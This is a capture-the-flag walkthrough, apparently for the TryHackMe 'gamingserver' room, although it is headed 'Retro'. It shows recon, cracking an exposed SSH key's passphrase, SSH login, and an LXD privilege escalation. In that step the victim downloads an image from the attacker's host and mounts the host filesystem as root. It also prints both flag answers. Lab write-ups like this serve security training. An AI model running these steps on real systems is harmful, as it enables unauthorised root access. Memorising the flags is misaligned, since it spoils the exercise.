# Retro Walkthrough
### Link
- https://tryhackme.com/room/gamingserver
---
### Recon
```
nmap -sC -sC -p- [IP]
```
**Namp scan result**
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
I also start in parallel **gobuster**
```
sudo gobuster dir -u http://[IP] -w ~/Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt
```
**Gobuster result**
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.47.85
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /Users/laurentnebout/Documents/Tools/SecLists-master/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/02/20 14:54:29 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 312] [--> http://10.10.47.85/uploads/]
/secret               (Status: 301) [Size: 311] [--> http://10.10.47.85/secret/]
```
Continue to explore with the first directory **/uploads**.

We hae 3 files: **dict.lst**, **manifesto.txt**,**meme.jpg**. Download all files locally to analyze them.
- First: **manifesto.txt**
Nothing interesting
- Second: **meme.jpg**
I tried to use **steghide**
```
steghide extract -sf /media/sf_LOLO_Share/THM/meme.jpg    
Enter passphrase: 
steghide: could not extract any data with that passphrase!
```
Maybe we can find the passphrase later....
- Third: **dict.lst**
Clearly a password list.

Next step, check **/secret**

Awesome!!! We have the Secret key. We can use it to SSH the victim server.
- First: Download it
- Second: Convert the key to a readable format for **john**
```
/usr/share/john/ssh2john.py secretKey > GamingKey  
```
- Third: Crack the key with **john** and the list **dict.lst**
```
john --wordlist=/media/sf_LOLO_Share/THM/dict.lst /media/sf_LOLO_Share/THM/GamingKey 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)     
1g 0:00:00:00 DONE (2022-02-20 15:26) 100.0g/s 21700p/s 21700c/s 21700C/s letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We have the password but not yet the user name.... We didn't find this information into **manifesto.txt**. 

By checking the source of the main page
```
	<div id="footer">
			<ul>
				<li>
					<a href="about.html" class="video">&nbsp;</a>
				</li>
				<li>
					<a href="myths.html" class="myths">&nbsp;</a>
				</li>
				<li class="last">
					<a href="#" class="archives">&nbsp;</a>
				</li>
			</ul>
		</div>
	</div>
</body>
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
</html>
```
OK, we have a userbane **john**
---
### Exploitation
SSH the victim machine witht he key
```
chmod 600 secretKey
ssh -i secretKey john@10.10.47.85
Enter passphrase for key 'secretKey':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Feb 20 20:34:46 UTC 2022

  System load:  0.0               Processes:           98
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 17%               IP address for eth0: 10.10.47.85
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$
```
```
john@exploitable:~$ ls -l
total 4
-rw-rw-r-- 1 john john 33 Feb  5  2020 user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```
**Question**
#### What is the user flag?
**Answer** 
#### a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
---
### Privilege escalation
The command **sudo -l** requiered a password to be executed. Let's check **id** output.
```
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```
john is under **LXD group**, so we can try to perform the privilege escalation through **lxd**

- First: As usual, let's try to find an exploit or pattern. And finally, this [website](https://www.hackingarticles.in/lxd-privilege-escalation/)
- Second: Clone this [repo](https://github.com/saghul/lxd-alpine-builder.git)
```
git clone  https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 50, done.
remote: Counting objects: 100% (8/8), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
Receiving objects: 100% (50/50), 3.11 MiB | 5.41 MiB/s, done.
Resolving deltas: 100% (15/15), done.

cd lxd-alpine-builder    
                                                                                                                    
└─$ ls   
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
```
- Third: Execute the script “build -alpine”
```
-rw-r--r-- 1 root root 3232323 Feb 20 15:46 alpine-v3.15-x86_64-20220220_1546.tar.gz
-rwxr-xr-x 1 bou  bou     8060 Feb 20 15:45 build-alpine
-rw-r--r-- 1 bou  bou    26530 Feb 20 15:45 LICENSE
-rw-r--r-- 1 bou  bou      768 Feb 20 15:45 README.md
```
- Fourth: From the directory where you have **alpine-v3.15-x86_64-20220220_1546.tar.gz**, start local server
```
python -m SimpleHTTPServer
```
- Fifth: From the victim, Download the file
```
john@exploitable:~$ cd /tmp/
john@exploitable:/tmp$ wget http://10.6.96.167:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2022-02-20 20:52:10--  http://10.6.96.167:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.6.96.167:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/octet-stream]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_ 100%[==========>]   3.11M  1.47MB/s    in 2.1s

2022-02-20 20:52:12 (1.47 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]

john@exploitable:/tmp$ ls -l
total 3196
-rw-rw-r-- 1 john john 3259593 Feb 20 20:50 alpine-v3.13-x86_64-20210218_0139.tar.gz
drwx------ 3 root root    4096 Feb 20 19:49 systemd-private-4f0fbdea09514d25b5607791b1adb552-apache2.service-oAdjWA
drwx------ 3 root root    4096 Feb 20 19:48 systemd-private-4f0fbdea09514d25b5607791b1adb552-systemd-resolved.service-YOQaUo
drwx------ 3 root root    4096 Feb 20 19:48 systemd-private-4f0fbdea09514d25b5607791b1adb552-systemd-timesyncd.service-XpDlRe
```
- Sixth: Add the image and check this step
```
john@exploitable:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myiamge
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
john@exploitable:/tmp$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myiamge | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Feb 20, 2022 at 8:53pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
```
- Seventh: Follow the command from [website](https://www.hackingarticles.in/lxd-privilege-escalation/)
```
john@exploitable:/tmp$ lxc init myiamge ignite -c security.privileged=true
Creating ignite
john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:/tmp$ lxc start ignite
john@exploitable:/tmp$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ #
```
```
~ # cd /mnt/root
/mnt/root # ls
bin             etc             lib             mnt             run             swap.img        var
boot            home            lib64           opt             sbin            sys             vmlinuz
cdrom           initrd.img      lost+found      proc            snap            tmp             vmlinuz.old
dev             initrd.img.old  media           root            srv             usr
/mnt/root # cd  root
/mnt/root/root # ls
root.txt
/mnt/root/root # cat root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```
**Question**
#### What is the root flag?
**Answer** 
#### 2e337b8c9f3aff0c2b3e8d4e6a7c88fc